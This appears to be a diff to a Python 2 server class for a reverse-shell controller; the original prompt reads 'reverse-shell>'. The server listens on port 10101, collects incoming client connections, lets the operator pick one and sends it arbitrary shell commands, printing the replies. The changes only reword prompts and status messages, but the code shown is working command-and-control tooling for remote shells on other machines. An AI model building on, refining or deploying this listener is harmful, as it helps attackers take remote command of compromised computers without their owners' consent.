@@ -12,25 +12,22 @@ class Server(object):
 
     # creates socket, waits for connections from clients, and initiates the prompt for the user
     def start(self):
-        print("Starting server...")
         self.create_socket()
         self.create_threads()
 
     # creates a socket to accept connections from clients
     def create_socket(self):
-        print("Configuring socket...")
         try:
             self.sckt = socket.socket()
             self.sckt.bind(("", 10101))
             self.sckt.listen(5)
         except socket.error:
-            print("- error: unable to configure socket")
-            print("- try again in 1 to 3 minutes")
+            print("\nUnable to configure socket.")
+            print("Please try again in a few minutes.\n")
             sys.exit()
 
     # creates 2 threads to simultaneously accept connections from clients and manage the prompt for the user
     def create_threads(self):
-        print("Creating threads...")
         for number in range(2):
             thread = None
             if number == 0:
@@ -46,37 +43,40 @@ class Server(object):
             connection, address = self.sckt.accept()
             self.connections.append(connection)
             self.addresses.append(address)
+            print("                       ")
+            self.show_connections()
+            print("\nSelect a connection: ")
         except socket.error:
-            print("- error: unable to accept connection")
+            print("\nUnable to accept a connection.\n")
 
     # manages the prompt for the user based on what he or she entered
     def show_prompt(self):
         while True:
-            command = raw_input("\nreverse-shell> ")
-            if command == "quit":
+            self.show_connections()
+            selection = raw_input("\nSelect a connection: ")
+            if selection == "quit":
                 self.close_connections()
                 break
-            elif command == "list":
-                self.show_connections()
-            elif command[:6] == "select":
-                if not self.error_check_for_send_commands(command[7:]):
-                    self.send_commands(int(command[7:]))
+            if not self.error_check_for_send_commands(selection):
+                self.send_commands(int(selection))
             else:
-                print("- command not recognized")
+                print("- selection not available")
 
     # shows a list of available connections to the user on the prompt
     def show_connections(self):
-        print("---------- Connections ----------")
+        print("\n---------- Connections ----------")
         for index, address in enumerate(self.addresses):
             try:
                 self.connections[index].send("?")
-                self.connections[index].recv(1024)
+                self.connections[index].recv(2048)
             except socket.error:
                 self.remove_connection(index)
                 continue
-            print(str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))
+            print("\n" + str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))
         if len(self.connections) == 0:
-            print("    no available connections")
+            print("\n          No Connections")
+        print("\n---------------------------------")
+        print("\nEnter 'quit' to exit the program")
 
     # checks whether the user entered the argument for the 'select' command appropriately
     def error_check_for_send_commands(self, argument):
@@ -97,7 +97,7 @@ class Server(object):
 
     # sends the commands the user entered for the selected client
     def send_commands(self, index):
-        print("")
+        print("\nEnter 'done' to exit the connection\n")
         while True:
             command = raw_input(self.addresses[index][0] + "> ")
             if command == "done":
@@ -108,7 +108,7 @@ class Server(object):
                     response = str(self.connections[index].recv(1024))
                     print(response)
                 except socket.error:
-                    print("- error: lost connection")
+                    print("- lost connection")
                     break
 
     # removes a connection by index from the lists of available connections and addresses
